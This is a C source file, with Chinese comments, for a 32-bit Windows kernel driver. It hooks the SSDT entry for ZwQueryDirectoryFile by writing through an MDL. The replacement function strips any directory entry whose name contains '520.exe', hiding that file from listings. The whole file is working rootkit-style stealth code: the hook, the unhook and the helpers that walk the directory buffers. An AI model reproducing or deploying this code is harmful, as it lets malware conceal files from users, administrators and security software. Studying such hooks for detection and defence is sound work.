#include "SSDTHook.h"
#include "SSDTFunctionIndex.h"
#include "SSDTFunction_32.h"


// SSDT Hook
BOOLEAN SSDTHook()
{
	UNICODE_STRING ustrDllFileName;
	ULONG ulSSDTFunctionIndex = 0;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulNewFuncAddr = 0;

	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	// 从 ntdll.dll 中获取 SSDT 函数索引号
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
	// 根据索引号, 从SSDT表中获取对应函数地址
	g_pOldSSDTFunctionAddress = (PVOID)KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex];
	if (NULL == g_pOldSSDTFunctionAddress)
	{
		DbgPrint("Get SSDT Function Error!\n");
		return FALSE;
	}
	// 使用 MDL 方式修改 SSDT
	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}
	// 写入新函数地址
	ulNewFuncAddr = (ULONG)New_ZwQueryDirectoryFile;
	RtlCopyMemory(pNewAddress, &ulNewFuncAddr, sizeof(ULONG));

	// 释放
	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);
	
	return TRUE;
}


// SSDT Unhook
BOOLEAN SSDTUnhook()
{
	UNICODE_STRING ustrDllFileName;
	ULONG ulSSDTFunctionIndex = 0;
	PVOID pSSDTFunctionAddress = NULL;
	PMDL pMdl = NULL;
	PVOID pNewAddress = NULL;
	ULONG ulOldFuncAddr = 0;

	RtlInitUnicodeString(&ustrDllFileName, L"\\??\\C:\\Windows\\System32\\ntdll.dll");
	// 从 ntdll.dll 中获取 SSDT 函数索引号
	ulSSDTFunctionIndex = GetSSDTFunctionIndex(ustrDllFileName, "ZwQueryDirectoryFile");
	// 使用 MDL 方式修改 SSDT
	pMdl = MmCreateMdl(NULL, &KeServiceDescriptorTable.ServiceTableBase[ulSSDTFunctionIndex], sizeof(ULONG));
	if (NULL == pMdl)
	{
		DbgPrint("MmCreateMdl Error!\n");
		return FALSE;
	}
	MmBuildMdlForNonPagedPool(pMdl);
	pNewAddress = MmMapLockedPages(pMdl, KernelMode);
	if (NULL == pNewAddress)
	{
		IoFreeMdl(pMdl);
		DbgPrint("MmMapLockedPages Error!\n");
		return FALSE;
	}
	// 写入原函数地址
	ulOldFuncAddr = (ULONG)g_pOldSSDTFunctionAddress;
	RtlCopyMemory(pNewAddress, &ulOldFuncAddr, sizeof(ULONG));

	// 释放
	MmUnmapLockedPages(pNewAddress, pMdl);
	IoFreeMdl(pMdl);

	return TRUE;
}


// 新函数
NTSTATUS New_ZwQueryDirectoryFile(
	IN HANDLE               FileHandle,
	IN HANDLE               Event OPTIONAL,
	IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
	IN PVOID                ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK    IoStatusBlock,
	OUT PVOID               FileInformation,
	IN ULONG                Length,
	IN FILE_INFORMATION_CLASS FileInformationClass,
	IN BOOLEAN              ReturnSingleEntry,
	IN PUNICODE_STRING      FileMask OPTIONAL,
	IN BOOLEAN              RestartScan
	)
{
	NTSTATUS status = STATUS_SUCCESS;
	typedef NTSTATUS(*typedef_ZwQueryDirectoryFile)(
		IN HANDLE               FileHandle,
		IN HANDLE               Event OPTIONAL,
		IN PIO_APC_ROUTINE      ApcRoutine OPTIONAL,
		IN PVOID                ApcContext OPTIONAL,
		OUT PIO_STATUS_BLOCK    IoStatusBlock,
		OUT PVOID               FileInformation,
		IN ULONG                Length,
		IN FILE_INFORMATION_CLASS FileInformationClass,
		IN BOOLEAN              ReturnSingleEntry,
		IN PUNICODE_STRING      FileMask OPTIONAL,
		IN BOOLEAN              RestartScan
		);
	// 执行原函数
	status = ((typedef_ZwQueryDirectoryFile)g_pOldSSDTFunctionAddress)(FileHandle,
												Event,
												ApcRoutine,
												ApcContext,
												IoStatusBlock,
												FileInformation,
												Length,
												FileInformationClass,
												ReturnSingleEntry,
												FileMask,
												RestartScan);

	//这里判定函数是否执行成功，而且获取的是否是文件或目录
	if (NT_SUCCESS(status) && (
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation
		))
	{
		PVOID pCurrent = FileInformation;
		PVOID pPre = NULL;
		ULONG ulNextOffset = 0;
		ULONG ulBufferSize = 1024;
		PWCHAR pwszFileName = ExAllocatePool(NonPagedPool, ulBufferSize);
		if (NULL == pwszFileName)
		{
			return status;
		}

		do
		{
			// 获取下一个文件信息的偏移
			ulNextOffset = GetNextEntryOffset(pCurrent, FileInformationClass);
			// 获取当前节点的文件名称
			RtlZeroMemory(pwszFileName, ulBufferSize);
			GetEntryFileName(pCurrent, FileInformationClass, pwszFileName, ulBufferSize);
			DbgPrint("[%S]\n", pwszFileName);
			// 隐藏指定的名称的文件或者目录
			if (NULL != wcsstr(pwszFileName, L"520.exe"))
			{
				DbgPrint("Have Hide File Or Directory![%S]\n", pwszFileName);

				// 如果是最后一个文件信息
				if (0 == ulNextOffset)
				{
					// 判断是否为第一个文件
					if (NULL == pPre)
					{
						status = STATUS_NO_MORE_FILES;
					}
					else
					{
						// 将上一个文件信息的下一文件信息偏移大小置为 0
						SetNextEntryOffset(pPre, FileInformationClass, 0);
					}
					break;
				}
				else
				{
					// 把剩下的文件信息覆盖到当前文件信息中
					ULONG ulCurrentOffset = (ULONG)((PUCHAR)pCurrent - (PUCHAR)FileInformation);
					ULONG ulLeftInfoData = (ULONG)Length - (ulCurrentOffset + ulNextOffset);
					RtlCopyMemory(pCurrent, (PVOID)((PUCHAR)pCurrent + ulNextOffset), ulLeftInfoData);

					continue;
				}
			}
			// 继续遍历
			pPre = pCurrent;
			pCurrent = ((PUCHAR)pCurrent + ulNextOffset);
		} while (0 != ulNextOffset);

		// 释放
		if (pwszFileName)
		{
			ExFreePool(pwszFileName);
			pwszFileName = NULL;
		}
	}

	return status;
}


// 从各种文件信息类型中获取文件名称
VOID GetEntryFileName(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, PWCHAR pwszFileName, ULONG ulBufferSize)
{
	PWCHAR result = NULL;
	ULONG ulLength = 0;
	
	switch (FileInfo)
	{
	case FileDirectoryInformation:
		result = (PWCHAR)&((PFILE_DIRECTORY_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_DIRECTORY_INFORMATION)pData)->FileNameLength;
		break;
	case FileFullDirectoryInformation:
		result = (PWCHAR)&((PFILE_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdFullDirectoryInformation:
		result = (PWCHAR)&((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileBothDirectoryInformation:
		result = (PWCHAR)&((PFILE_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileIdBothDirectoryInformation:
		result = (PWCHAR)&((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->FileNameLength;
		break;
	case FileNamesInformation:
		result = (PWCHAR)&((PFILE_NAMES_INFORMATION)pData)->FileName[0];
		ulLength = ((PFILE_NAMES_INFORMATION)pData)->FileNameLength;
		break;
	}
	
	RtlZeroMemory(pwszFileName, ulBufferSize);
	RtlCopyMemory(pwszFileName, result, ulLength);
}


// 在各种文件信息类型中设置下一个文件的偏移
VOID SetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo, IN ULONG Offset)
{
	switch (FileInfo)
	{
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset = Offset;
		break;
	}
}


// 从各种文件信息类型中获取下一个文件的偏移
ULONG GetNextEntryOffset(IN PVOID pData, IN FILE_INFORMATION_CLASS FileInfo)
{
	ULONG result = 0;
	switch (FileInfo){
	case FileDirectoryInformation:
		result = ((PFILE_DIRECTORY_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = ((PFILE_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = ((PFILE_ID_FULL_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = ((PFILE_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = ((PFILE_ID_BOTH_DIR_INFORMATION)pData)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = ((PFILE_NAMES_INFORMATION)pData)->NextEntryOffset;
		break;
	}
	return result;
}






